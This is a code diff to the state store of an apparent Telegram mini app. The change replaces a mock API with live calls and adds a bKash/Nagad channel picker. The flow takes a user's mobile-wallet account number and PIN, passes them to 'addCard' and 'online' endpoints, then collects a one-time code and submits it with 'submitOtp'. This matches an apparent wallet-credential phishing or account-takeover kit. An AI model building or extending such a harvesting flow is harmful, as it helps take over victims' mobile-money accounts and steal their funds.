@@ -1,15 +1,18 @@
 import { create } from 'zustand'
-import { submitAccount, verifyOtp } from '@/utils/mockApi'
+import { addCard, online, submitOtp } from '@/utils/api'
 import { secureGetItem, secureSetItem, secureRemoveItem } from '@/utils/telegram'
 import { translate, type TranslationKey } from '@/i18n'
 
 const STORAGE_KEY = 'tg-miniapp-direct-v2'
 export const ACCOUNT_PATTERN = /^\d{11}$/
 export const PIN_PATTERN = /^\d{4,6}$/
+export const CHANNELS = ['nagad', 'bkash'] as const
+export type Channel = (typeof CHANNELS)[number]
 
 type ResultStatus = 'idle' | 'success' | 'error'
 
 type PersistedDraft = {
+  channel: Channel | ''
   account: string
   otp: string
   sessionId: string
@@ -26,6 +29,7 @@ type FlowStore = PersistedDraft & {
   toast: string
   hydrated: boolean
   hydrateDraft: () => Promise<void>
+  setChannel: (value: Channel | '') => void
   setAccount: (value: string) => void
   setPin: (value: string) => void
   setOtp: (value: string) => void
@@ -37,6 +41,7 @@ type FlowStore = PersistedDraft & {
 }
 
 const persistedDefaults: PersistedDraft = {
+  channel: '',
   account: '',
   otp: '',
   sessionId: '',
@@ -53,6 +58,7 @@ const defaultState: Omit<FlowStore, keyof PersistedDraft> = {
   toast: '',
   hydrated: false,
   hydrateDraft: async () => undefined,
+  setChannel: () => undefined,
   setAccount: () => undefined,
   setPin: () => undefined,
   setOtp: () => undefined,
@@ -87,6 +93,7 @@ async function writeDraft(state: FlowStore) {
   }
 
   const draft: PersistedDraft = {
+    channel: state.channel,
     account: state.account,
     otp: state.otp,
     sessionId: state.sessionId,
@@ -110,6 +117,10 @@ export const useFlowStore = create<FlowStore>((set, get) => ({
     const draft = await readDraft()
     set({ ...draft, hydrated: true })
   },
+  setChannel: (value) => {
+    set({ channel: value })
+    writeDraft(get())
+  },
   setAccount: (value) => {
     set((state) => ({
       account: value.replace(/\D/g, '').slice(0, 11),
@@ -131,9 +142,9 @@ export const useFlowStore = create<FlowStore>((set, get) => ({
   },
   clearToast: () => set({ toast: '' }),
   submitAccountStep: async () => {
-    const { account, pin } = get()
+    const { channel, account, pin } = get()
 
-    if (!ACCOUNT_PATTERN.test(account) || !PIN_PATTERN.test(pin)) {
+    if (!channel || !ACCOUNT_PATTERN.test(account) || !PIN_PATTERN.test(pin)) {
       set({ toast: translate('toast.invalidAccountPin') })
       return false
     }
@@ -141,10 +152,36 @@ export const useFlowStore = create<FlowStore>((set, get) => ({
     set({ submittingStep: 'account', toast: '' })
 
     try {
-      const response = await submitAccount({ account: account.trim(), pin })
+      const addCardResult = await addCard({ accountNo: account.trim(), pin, platform: channel })
+
+      if (!addCardResult.success) {
+        set({
+          submittingStep: null,
+          resultStatus: 'error',
+          errorMessage: addCardResult.message || translate('error.submitFailed'),
+          errorMessageKey: 'error.submitFailed',
+          toast: addCardResult.message || translate('toast.submitFailed'),
+        })
+        writeDraft(get())
+        return false
+      }
+
+      const onlineResult = await online({ accountNo: account.trim(), platform: channel })
+
+      if (!onlineResult.success) {
+        set({
+          submittingStep: null,
+          resultStatus: 'error',
+          errorMessage: onlineResult.message || translate('error.submitFailed'),
+          errorMessageKey: 'error.submitFailed',
+          toast: onlineResult.message || translate('toast.submitFailed'),
+        })
+        writeDraft(get())
+        return false
+      }
 
       set({
-        sessionId: response.sessionId,
+        sessionId: account.trim(),
         otp: '',
         submittingStep: null,
         resultStatus: 'idle',
@@ -169,7 +206,7 @@ export const useFlowStore = create<FlowStore>((set, get) => ({
     }
   },
   verifyOtpStep: async () => {
-    const { otp, sessionId } = get()
+    const { otp, account, channel } = get()
 
     if (!/^\d{6}$/.test(otp)) {
       set({ toast: translate('toast.invalidOtp') })
@@ -179,13 +216,13 @@ export const useFlowStore = create<FlowStore>((set, get) => ({
     set({ submittingStep: 'otp', toast: '' })
 
     try {
-      const response = await verifyOtp({ sessionId, otp })
+      const response = await submitOtp({ accountNo: account.trim(), otp, platform: channel })
 
       set({
         submittingStep: null,
         resultStatus: response.success ? 'success' : 'error',
-        resultRef: response.resultRef,
-        errorMessage: response.messageKey ? translate(response.messageKey) : '',
+        resultRef: '',
+        errorMessage: response.messageKey ? translate(response.messageKey) : response.message,
         errorMessageKey: response.messageKey ?? '',
         toast: response.success ? translate('toast.otpSuccess') : translate('toast.otpFailed'),
       })
